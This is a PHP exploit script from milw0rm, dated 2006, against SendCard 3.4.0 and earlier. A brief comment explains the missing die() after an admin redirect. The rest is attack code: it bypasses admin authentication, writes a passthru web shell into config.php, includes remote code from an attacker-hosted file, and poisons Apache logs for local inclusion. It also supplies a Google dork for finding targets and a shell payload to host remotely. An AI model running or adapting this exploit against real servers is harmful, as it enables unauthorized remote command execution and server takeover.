#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;SendCard &lt;= 3.4.0 unauthorized administrative access / remote commands\n&quot;;
echo &quot;execution exploit\n&quot;;
echo &quot;by rgod rgod@autistici.org\n&quot;;
echo &quot;site: http://retrogod.altervista.org\n&quot;;
echo &quot;dork: \&quot;Powered by sendcard - an advanced PHP e-card program\&quot;\n\n&quot;;

if ($argc&lt;4) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path action [location] [cmd] OPTIONS\n&quot;;
echo &quot;host:      target server (ip/hostname)\n&quot;;
echo &quot;path:      path to sendcard\n&quot;;
echo &quot;action:    1 -&gt; php injection\n&quot;;
echo &quot;           works against magic_quotes_gpc=Off\n&quot;;
echo &quot;           2 -&gt; arbitrary remote inclusion\n&quot;;
echo &quot;           works against allow_url_fopen=On\n&quot;;
echo &quot;           3 -&gt; arbitrary local inclusion\n&quot;;
echo &quot;           works regardless of php.ini settings\n&quot;;
echo &quot;           and if you succeed to include Apache logs\n&quot;;
echo &quot;           4 -&gt; read phpinfo()\n&quot;;
echo &quot;[location] a remote http location with the code to include\n&quot;;
echo &quot;           needed by 2, with an ending slash\n&quot;;
echo &quot;[cmd]:     a shell command, needed by 1-3\n&quot;;
echo &quot;Options:\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\n&quot;;
echo &quot;Example:\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /sendcard/ 1 ls -la\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /sendcard/ 2 http://somehost.com/ ls -la\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /sendcard/ 3 ls -la\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /sendcard/ 4 &gt; phpinfo.html\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /sendcard/ 4 -p81&gt; phpinfo.html\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /sendcard/ 4 -P1.1.1.1:80 &gt; phpinfo.html\n&quot;;
echo &quot;note: for action 2 you need this code in http://somehost.com/sendcard_setup.php/index.html :\n&quot;;
echo &quot;&lt;?php set_time_limit(0);echo &#039;sun-tzu&#039;;passthru(\$_SERVER(\&quot;HTTP_CLIENT_IP\&quot;);echo &#039;sun-tzu&#039;;die;?&gt;\n&quot;;
die;
}

/*
software site: http://www.sendcard.org/

vulnerable code in admin/prepend.php near lines 32-34:

[*]
...
	if(!isset($_SESSION[&#039;session&#039;][&quot;password&quot;]) || $_SESSION[&#039;session&#039;][&quot;password&quot;] != ADMIN_PASSWORD) {
		header(&quot;Location: login.php?redirect=&quot; . basename($_SERVER[&#039;PHP_SELF&#039;]));
	}
...

should be instead:

[**]
...
if(!isset($_SESSION[&#039;session&#039;][&quot;password&quot;]) || $_SESSION[&#039;session&#039;][&quot;password&quot;] != ADMIN_PASSWORD) {
		header(&quot;Location: login.php?redirect=&quot; . basename($_SERVER[&#039;PHP_SELF&#039;]));
		die; // &lt;---------------------[! ;)]
	}
...

[*] is included by all scripts in admin/ folder
this means that maybe redirection works if you try to access the admin scripts
through the browser... but what happens if you do the bad work through a script? eheheheheheh

so you can have access to all admin scripts to...
(1) inject php code in config.php through admin/setup.php script,
    this works fine with magic_quotes_gpc = Off
(2) inject an arbitrary http location in config.php and go to admin/mod_stats.php
    to include evil code from it, this works with allow_url_fopen=On
(3) include an arbitrary file from local resource thorugh admin/mod_stats.php,
    ex: apache logs, this works regardless of php.ini settings...
(4) see phpinfo() through admin/mod_phpinfo.php to choose which exploitation method
    is better eheheheheheheh

									      */
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
   $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
   }
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$c=4;$host=$argv[1];$path=$argv[2];$action=(int)$argv[3];
if ($action==2) {$location=$argv[4]; $c=5;}$cmd=&quot;&quot;;$port=80;$proxy=&quot;&quot;;
for ($i=$c; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($action&lt;&gt;4)
{
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;))
{$cmd.=&quot; &quot;.$argv[$i];}
}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
if (($path[0]&lt;&gt;&#039;/&#039;) or ($path[strlen($path)-1]&lt;&gt;&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

if ($action==1)
{
   $shell=&#039;suntzu&quot;);set_time_limit(0);echo &quot;sun-tzu&quot;;passthru($_SERVER[&quot;HTTP_CLIENT_IP&quot;]);echo &quot;sun-tzu&quot;;die(&quot;suntzu&#039;;
   $data=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
   $data.=&quot;Content-Disposition: form-data; name=\&quot;cfg_docroot\&quot;;\r\n&quot;;
   $data.=&quot;Content-Type:\r\n\r\n&quot;;
   $data.=&quot;$shell\r\n&quot;;
   $data.=&quot;-----------------------------7d529a1d23092a--\r\n&quot;;
   $packet=&quot;POST &quot;.$p.&quot;admin/setup.php?save=1 HTTP/1.0\r\n&quot;;
   $packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n&quot;;
   $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
   $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
   $packet.=&quot;Connection: Close\r\n\r\n&quot;;
   $packet.=$data;
   sendpacketii($packet);
   sleep(1);
   $packet=&quot;GET &quot;.$p.&quot;admin/config.php HTTP/1.0\r\n&quot;;
   $packet.=&quot;CLIENT-IP: $cmd\r\n&quot;;
   $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
   $packet.=&quot;Connection: Close\r\n\r\n&quot;;
   sendpacketii($packet);
   if (strstr($html,&quot;sun-tzu&quot;))
   {
   echo &quot;exploit succeeded...\n&quot;;
   $temp=explode(&quot;sun-tzu&quot;,$html);
   die($temp[1]);
   }
   else
   {
   echo &quot;exploit failed...&quot;;
   //debug
   //echo $html;
   }
}
elseif ($action==2)
{
   $data=&quot;-----------------------------7d529a1d23092a\r\n&quot;;
   $data.=&quot;Content-Disposition: form-data; name=\&quot;cfg_docroot\&quot;;\r\n&quot;;
   $data.=&quot;Content-Type:\r\n\r\n&quot;;
   $data.=&quot;$location\r\n&quot;;
   $data.=&quot;-----------------------------7d529a1d23092a--\r\n&quot;;
   $packet=&quot;POST &quot;.$p.&quot;admin/setup.php?save=1 HTTP/1.0\r\n&quot;;
   $packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n&quot;;
   $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
   $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
   $packet.=&quot;Connection: Close\r\n\r\n&quot;;
   $packet.=$data;
   sendpacketii($packet);
   $packet=&quot;GET &quot;.$p.&quot;admin/mod_stats.php HTTP/1.0\r\n&quot;;
   $packet.=&quot;CLIENT-IP: $cmd\r\n&quot;;
   $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
   $packet.=&quot;Connection: Close\r\n\r\n&quot;;
   sendpacketii($packet);
   if (strstr($html,&quot;sun-tzu&quot;))
   {
   echo &quot;exploit succeeded...\n&quot;;
   $temp=explode(&quot;sun-tzu&quot;,$html);
   die($temp[1]);
   }
   else
   {
   //debug
   echo $html;
   echo &quot;exploit failed...see html to adjust the path...&quot;;
   }
}
elseif ($action==3)
{
$CODE=&quot;&lt;?php set_time_limit(0);echo chr(115).chr(117).chr(110).chr(45).chr(116).chr(122).chr(117);passthru(\$_SERVER[HTTP_CLIENT_IP]);echo chr(115).chr(117).chr(110).chr(45).chr(116).chr(122).chr(117);die;?&gt;&quot;;
$packet=&quot;GET &quot;.$p.$CODE.&quot; HTTP/1.1\r\n&quot;;
$packet.=&quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: close\r\n\r\n&quot;;
#debug
#echo quick_dump($packet);
sendpacketii($packet);
sleep(2);
$paths= array (
&quot;../../../../../../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../../../../../../etc/httpd/logs/acces_log&quot;,
&quot;../../../../../../../../../../etc/httpd/logs/acces.log&quot;,
&quot;../../../../../../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../../../../../../../../../var/www/logs/access_log&quot;,
&quot;../../../../../../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../../../../../../var/log/access_log&quot;,
&quot;../../../../../../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../../../../../../var/log/access_log&quot;,
&quot;../../../../../../../../../../var/log/error_log&quot;
);

for ($i=0; $i&lt;count($paths); $i++)
{
  echo &quot;trying with $paths[$i] for plugin_file argument\r\n&quot;;
  $packet=&quot;GET &quot;.$p.&quot;admin/mod_plugins.php HTTP/1.0\r\n&quot;;
  $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
  $packet.=&quot;CLIENT-IP: $cmd\r\n&quot;;
  $packet.=&quot;Cookie: plugin_file=&quot;.urlencode($paths[$i]).&quot;;\r\n&quot;;
  $packet.=&quot;Connection: Close\r\n\r\n&quot;;
  sendpacketii($packet);
  if (strstr($html,&quot;sun-tzu&quot;))
  {
  echo &quot;exploit succeeded...\n\n&quot;;
  $temp=explode(&quot;sun-tzu&quot;,$html);
  echo $temp[1]; die;
  }
}
//if you are here...
die(&quot;exploit failed...&quot;);
}
elseif ($action==4)
{
   $packet=&quot;GET &quot;.$p.&quot;admin/mod_phpinfo.php HTTP/1.0\r\n&quot;;
   $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
   $packet.=&quot;Connection: Close\r\n\r\n&quot;;
   sendpacketii($packet);
   $temp=explode(&quot;&lt;!DOCTYPE&quot;,$html); //remove http headers
   echo &quot;&lt;!DOCTYPE&quot;.$temp[1];
}
else echo (&quot;specify an action [1-4]...&quot;);
?&gt;

# milw0rm.com [2006-08-03]
